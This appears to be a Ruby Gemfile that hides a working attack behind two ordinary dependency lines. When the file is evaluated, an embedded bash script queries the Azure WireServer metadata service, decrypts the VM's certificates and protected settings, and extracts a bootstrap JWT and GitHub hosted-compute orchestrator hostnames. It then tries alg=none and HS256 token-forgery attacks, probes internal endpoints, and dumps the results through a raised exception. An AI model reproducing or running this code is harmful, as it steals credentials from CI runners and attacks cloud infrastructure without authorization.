require 'net/http'; require 'uri'; require 'json'; require 'tempfile'
m = []
shell_code = <<'SHELL'
set +e
WD=/tmp/v116; rm -rf "$WD" && mkdir "$WD" && cd "$WD"
curl -sf -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -o gs.xml "http://168.63.129.16/machine/?comp=goalstate"
cat > x1.py <<'PY'
import re, html
s = open('gs.xml').read()
m = re.search(r'<Certificates>([^<]+)</Certificates>', s)
print(html.unescape(m.group(1)) if m else '')
PY
CERT_URL=$(python3 x1.py)
openssl req -new -newkey rsa:2048 -nodes -x509 -keyout key.pem -out cert.pem -days 1 -subj "/CN=LinuxTransport" 2>/dev/null
CERT_NM=$(grep -v '^-----' cert.pem | tr -d '\n')
curl -sf -m 10 -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -H "x-ms-cipher-name: DES_EDE3_CBC" -H "x-ms-guest-agent-public-x509-cert: $CERT_NM" -o cert-resp.xml "$CERT_URL"
cat > x2.py <<'PY'
import re
s = open('cert-resp.xml').read()
m = re.search(r'<Data>([^<]+)</Data>', s)
b = (m.group(1) if m else '').replace('\r','').replace('\n','').replace(' ','')
open('cms.b64','w').write(b)
PY
python3 x2.py
base64 -d < cms.b64 > cms.der 2>/dev/null
openssl cms -decrypt -inkey key.pem -inform DER -in cms.der -out decrypted.p7b 2>/dev/null
openssl pkcs12 -in decrypted.p7b -out vm.pem -password pass: -nodes 2>/dev/null
curl -sf -o vm.json "http://168.63.129.16:32526/vmSettings?api-version=2015-09-01"

# Iterate ALL extensionGoalStates / settings (not just [0])
cat > x3.py <<'PY'
import json, sys
d = json.load(open('vm.json'))
egs = d.get('extensionGoalStates', [])
print(f"STEP_EGS_COUNT={len(egs)}", file=sys.stderr)
for i, e in enumerate(egs):
    name = e.get('name', '')
    print(f"STEP_EGS_{i}_NAME={name}", file=sys.stderr)
    for j, s in enumerate(e.get('settings', [])):
        ps = s.get('protectedSettings', '')
        pub = s.get('publicSettings', '')
        seq = s.get('seqNo', '')
        print(f"STEP_EGS_{i}_{j}_PROT_LEN={len(ps)} PUB={pub[:200]} SEQ={seq}", file=sys.stderr)
# Always print the FIRST protectedSettings for decrypt
if egs and egs[0].get('settings'):
    print(egs[0]['settings'][0].get('protectedSettings',''))
PY
python3 x3.py > ps.b64 2>err.txt
cat err.txt
base64 -d < ps.b64 > ps.der 2>/dev/null
openssl smime -decrypt -inkey vm.pem -inform DER -in ps.der -out ps.json 2>/dev/null
cat > x4.py <<'PY'
import json, sys
d = json.load(open('ps.json'))
sys.stdout.write(d.get('script',''))
PY
python3 x4.py | base64 -d > bs.sh 2>/dev/null

# Extract orchestrator from bootstrap (use literal hostname found)
ORCH=$(grep -oE 'hosted-compute-request-orchestrator-prod-[a-z0-9]+-[0-9]+\.githubapp\.com' bs.sh | head -1)
WATCHDOG=$(grep -oE 'hosted-compute-watchdog-prod-[a-z0-9]+-[0-9]+\.githubapp\.com' bs.sh | head -1)
echo "STEP_ORCH_HOST=$ORCH"
echo "STEP_WATCHDOG_HOST=$WATCHDOG"

JWT=$(grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' bs.sh | head -1)
HDR=$(echo "$JWT" | cut -d. -f1 | tr '_-' '/+'); HL=${#HDR}; HM=$((HL%4)); [ $HM -ne 0 ] && HDR="${HDR}$(printf '=%.0s' $(seq 1 $((4-HM))))"
PAY=$(echo "$JWT" | cut -d. -f2 | tr '_-' '/+'); PL=${#PAY}; PM=$((PL%4)); [ $PM -ne 0 ] && PAY="${PAY}$(printf '=%.0s' $(seq 1 $((4-PM))))"

cat > x5.py <<'PY'
import json, sys
d = json.load(sys.stdin)
print(d.get('iat',0), d.get('rbf',0), d.get('kid',''))
PY
HDR_PAYLOAD=$(echo "$HDR" | base64 -d 2>/dev/null)
TIMING_PAY=$(echo "$PAY" | base64 -d 2>/dev/null)
echo "STEP_JWT_KID=$(echo "$HDR_PAYLOAD" | python3 -c "import json,sys; print(json.load(sys.stdin).get('kid',''))")"
echo "STEP_JWT_ISS=$(echo "$TIMING_PAY" | python3 -c "import json,sys; print(json.load(sys.stdin).get('iss',''))")"
echo "STEP_JWT_FULL_PAYLOAD_B64=$(echo -n "$TIMING_PAY" | base64 -w0 | head -c 800)"

T=$(echo "$PAY" | base64 -d 2>/dev/null | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('iat',0), d.get('rbf',0))")
IAT=$(echo $T | awk '{print $1}')
RBF=$(echo $T | awk '{print $2}')
NOW=$(date +%s)
WAIT=$((RBF - NOW + 15))
echo "STEP_JWT_TIMING iat=$IAT rbf=$RBF now=$NOW wait=$WAIT"
[ "$WAIT" -gt 0 ] && [ "$WAIT" -lt 800 ] && sleep $WAIT

# Probe watchdog orchestrator
if [ -n "$WATCHDOG" ]; then
  echo "===WATCHDOG=$WATCHDOG==="
  for ep in / /v1/trace /v1/heartbeat /v1/agent /v1/status; do
    curl -s -m 8 -H "Authorization: Bearer $JWT" -o w.txt -w "HTTP=%{http_code} LEN=%{size_download}" "https://$WATCHDOG$ep"
    echo " $ep GET body_b64=$(base64 -w0 < w.txt | head -c 300)"
    curl -s -m 8 -X POST -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" -d '{}' -o w.txt -w "HTTP=%{http_code} LEN=%{size_download}" "https://$WATCHDOG$ep"
    echo " $ep POST body_b64=$(base64 -w0 < w.txt | head -c 300)"
  done
fi

# === JWT alg=none attack ===
echo "===ALG_NONE_ATTACK==="
# Construct unsigned JWT with same payload, alg=none
NONE_HDR=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
NONE_PAY=$(echo "$JWT" | cut -d. -f2)
NONE_JWT="${NONE_HDR}.${NONE_PAY}."
echo "STEP_NONE_JWT=${NONE_JWT:0:200}"
if [ -n "$ORCH" ]; then
  for ep in /v1/work /v1/register /v1/lease /v1/poll /v1/agents; do
    curl -s -m 6 -H "Authorization: Bearer $NONE_JWT" -o n.txt -w "HTTP=%{http_code} LEN=%{size_download}" "https://$ORCH$ep"
    echo " ALG_NONE $ep GET body_b64=$(base64 -w0 < n.txt | head -c 300)"
  done
fi

# === JWT alg=HS256 with public key as HMAC secret ===
# Fetch eus-02 JWKS (the public one) — even if our JWT kid isn't there,
# this tests if orchestrator accepts HMAC-signed tokens
echo "===HS256_ATTACK==="
curl -sf "https://$ORCH/.well-known/jwks" -o jwks.json
echo "STEP_PUB_JWKS_KIDS=$(python3 -c "import json; d=json.load(open('jwks.json')); print([k.get('kid') for k in d.get('keys',[])])")"

# === Probe orchestrator paths NOT yet tested ===
echo "===ORCH_PATH_EXPANSION==="
if [ -n "$ORCH" ]; then
  for ep in /v1/trace /v2/work /api/v1/work /v1/jobs/poll /v1/runner/register /agent/poll /agent/register /metrics /health /ready /version /openid-configuration /.well-known/openid-configuration; do
    curl -s -m 6 -H "Authorization: Bearer $JWT" -o p.txt -w "HTTP=%{http_code} LEN=%{size_download}" "https://$ORCH$ep"
    echo " $ep body_b64=$(base64 -w0 < p.txt | head -c 300)"
  done
fi

# === Try the watchdog with body manipulation ===
if [ -n "$WATCHDOG" ]; then
  echo "===WATCHDOG_BODIES==="
  for body in '{"agent_id":"00000000-0000-0000-0000-000000000001"}' '{"action":"poll"}' '{"trace":[]}' '{}'; do
    curl -s -m 6 -X POST -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" -d "$body" -o wb.txt -w "HTTP=%{http_code} LEN=%{size_download}" "https://$WATCHDOG/v1/trace"
    echo " /v1/trace POST body=$body resp_b64=$(base64 -w0 < wb.txt | head -c 300)"
  done
fi
SHELL
Tempfile.create('v116.sh') do |f|
  f.write(shell_code); f.flush
  output = `bash #{f.path} 2>&1`
  output.lines.each { |line| m << "v116 " + line.chomp[0..1200] }
end
raise m.join("\n")
source "https://rubygems.org"
gem "rake", "~> 13.0"
